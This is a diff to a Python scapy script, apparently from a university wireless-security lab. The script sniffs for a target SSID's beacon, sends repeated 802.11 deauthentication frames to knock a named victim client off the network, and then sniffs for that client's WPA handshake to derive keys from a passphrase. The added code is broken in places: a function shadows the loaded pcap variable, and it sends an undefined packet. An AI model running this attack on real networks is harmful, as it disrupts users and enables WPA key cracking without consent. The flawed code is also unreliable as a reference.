@@ -1,21 +1,5 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
-
-"""
-Derive WPA keys from Passphrase and 4-way handshake info
-
-Calcule un MIC d'authentification (le MIC pour la transmission de données
-utilise l'algorithme Michael. Dans ce cas-ci, l'authentification, on utilise
-sha-1 pour WPA2 ou MD5 pour WPA)
-"""
-
-__author__      = "Abraham Rubinstein"
-__copyright__   = "Copyright 2017, HEIG-VD"
-__license__ 	= "GPL"
-__version__ 	= "1.0"
-__email__ 		= "abraham.rubinstein@heig-vd.ch"
-__status__ 		= "Prototype"
-
 from scapy.all import *
 from binascii import a2b_hex, b2a_hex
 from pbkdf2_math import pbkdf2_hex
@@ -23,34 +7,45 @@ from numpy import array_split
 from numpy import array
 import hmac, hashlib
 
-# Permet de filtrer les paquetes sniffées et lister les réseaux enregistrées auxquelles les clients tentents de se connecter
-# Paramètre : paquet sniffé qui doit être filtré
-# Remarque : On filtre les paquets par type (0 et 2 - probe request)
-
-def deauth(nbrTime, APmacArg):
-	packet = RadioTap()/Dot11(type=0,subtype=12,addr1=victimMAC,addr2=APmacArg,addr3=APmacArg)/Dot11Deauth(reason=7)
-	for n in range(nbrTime):
-		sendp(packet)
-		print 'Deauth sent via: ' + interface + ' to BSSID: ' + APmacArg + ' for Client: ' + victimMAC
-
-def pkt_callback(pkt):
-	if pkt.type == 0 and pkt.subtype == 8:
-		if pkt.info == ssidToHack:
-			APmac = pkt.addr2
-			print "AP MAC: %s" %(pkt.addr2)
-			deauth(100, APmac)
-			return True
-
-
 interface = sys.argv[1]
 ssidToHack = sys.argv[2]
 victimMAC = sys.argv[3]
 
-# Sniff le réseau en fct l'interface et filtres les paquets
-sniff(iface=interface, stop_filter=pkt_callback)
+deauth = rdpcap("deauthExemple.pcap")
 
-# Read capture file -- it contains beacon, authentication, associacion, handshake and data
-wpa=rdpcap("wpa_handshake.cap") 
+def deauth(nbrTime, APmacArg):
+
+	
+
+	deauth[0].addr1 = a2b_hex(victimMAC.replace(":",""))
+	deauth[0].addr2 = a2b_hex(APmacArg.replace(":",""))
+	deauth[0].addr3 = a2b_hex(APmacArg.replace(":",""))
+
+	for n in range(nbrTime):
+		sendp(packet)
+		print 'Deauth sent via: ' + interface + ' to BSSID: ' + APmacArg + ' for Client: ' + victimMAC
+
+
+def AP_sniff(pkt):
+	if pkt.type == 0 and pkt.subtype == 8:
+		if pkt.info == ssidToHack:
+			return True
+
+def handshake_sniff(pkt):
+	if pkt.type == 2 and pkt.subtype == 0:
+		if pkt.addr2 == victimMAC:
+			return True
+
+
+# Sniff le réseau en fct l'interface et filtres les paquets
+pktAP = sniff(iface=interface,stop_filter=AP_sniff)
+
+APmac = pktAP[len(pktAP)-1].addr2
+
+pktHS = sniff(iface=interface,stop_filter=handshake_sniff)
+
+
+
 
 # Important parameters for key derivation - most of them can be obtained from the pcap file
 passPhrase  = "actuelle"
